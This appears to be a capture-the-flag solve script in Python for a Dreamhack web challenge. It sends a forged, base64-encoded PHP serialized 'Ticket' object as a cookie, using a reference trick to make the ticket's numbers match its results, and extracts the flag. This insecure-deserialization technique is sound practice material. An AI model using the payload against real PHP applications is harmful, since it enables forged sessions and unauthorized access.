import requests
import re

url = "http://host8.dreamhack.games:23325/"

payload = 'Tzo2OiJUaWNrZXQiOjI6e3M6NzoicmVzdWx0cyI7YTowOnt9czo3OiJudW1iZXJzIjtSOjI7fQ=='

res = requests.get(f'{url}/result.php', cookies={
    'ticket': payload
})

flag = re.findall(r'(DH{.+})', res.text)[0]
print("Flag:", flag)